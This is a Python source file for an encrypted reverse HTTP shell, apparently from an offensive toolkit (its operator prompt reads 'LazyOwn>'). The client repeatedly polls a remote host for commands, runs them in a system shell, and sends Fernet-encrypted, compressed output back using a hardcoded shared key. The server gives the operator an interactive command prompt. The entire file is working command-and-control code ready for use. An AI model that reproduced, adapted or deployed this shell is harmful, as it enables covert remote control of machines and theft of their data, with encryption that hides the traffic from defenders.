import sys
import requests
import subprocess
import time
import base64
import zlib
from http.server import BaseHTTPRequestHandler, HTTPServer
from cryptography.fernet import Fernet

FIXED_KEY = b'TGEPpacDlj_czSt_mNwnLvi67K4yHf16795gV8NZ3Pc='
cipher_suite = Fernet(FIXED_KEY)

def encrypt(data):
    return cipher_suite.encrypt(data)

def decrypt(data):
    return cipher_suite.decrypt(data)

def compress(data):
    return zlib.compress(data)

def decompress(data):
    return zlib.decompress(data)

def reverse_http_shell_client(lhost, rhost, rport):
    while True:
        try:
            req = requests.get(f'http://{lhost}:{rport}', headers={'X-Auth': FIXED_KEY.decode()})
            if req.status_code != 200:
                print(f"[!] Authentication failed: {req.status_code}")
                break
            
            command = decrypt(base64.b64decode(req.text)).decode()

            if 'terminate' in command:
                break

            else:
                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = CMD.stdout.read() + CMD.stderr.read()
                encoded_output = base64.b64encode(encrypt(compress(output))).decode()
                requests.post(f'http://{rhost}:{rport}', data=encoded_output, headers={'X-Auth': FIXED_KEY.decode()})

            time.sleep(3)
        except Exception as e:
            print(f'[!] Error: {e}')
            time.sleep(10)

def reverse_http_shell_server(lhost, lport):
    class RequestHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.headers.get('X-Auth') != FIXED_KEY.decode():
                self.send_response(403)
                self.end_headers()
                return
            
            command = input("LazyOwn> ")
            encrypted_command = base64.b64encode(encrypt(command.encode())).decode()
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(encrypted_command.encode())

        def do_POST(self):
            if self.headers.get('X-Auth') != FIXED_KEY.decode():
                self.send_response(403)
                self.end_headers()
                return
            
            self.send_response(200)
            self.end_headers()
            length = int(self.headers['Content-Length'])
            postData = self.rfile.read(length)
            output = decompress(decrypt(base64.b64decode(postData)))
            print(output.decode())

    server_class = HTTPServer
    httpd = server_class((lhost, int(lport)), RequestHandler)

    try:
        print(f'[+] Server started at http://{lhost}:{lport}')
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('[!] Server is terminated')
        httpd.server_close()

def parse_arguments(args):
    options = {"--lhost": None, "--lport": None, "--rhost": None, "--rport": None, "mode": None}
    for i in range(len(args)):
        if args[i] in options:
            options[args[i]] = args[i + 1]
        if args[i] in ["client", "server"]:
            options["mode"] = args[i]
    return options

if __name__ == "__main__":
    options = parse_arguments(sys.argv)
    
    if options["mode"] == "client":
        if options["--lhost"] and options["--rhost"] and options["--rport"]:
            reverse_http_shell_client(options["--lhost"], options["--rhost"], options["--rport"])
        else:
            print("[!] Missing required arguments for client mode")
    
    elif options["mode"] == "server":
        if options["--lhost"] and options["--lport"]:
            reverse_http_shell_server(options["--lhost"], options["--lport"])
        else:
            print("[!] Missing required arguments for server mode")
    
    else:
        print("[!] Invalid mode. Use 'client' or 'server'")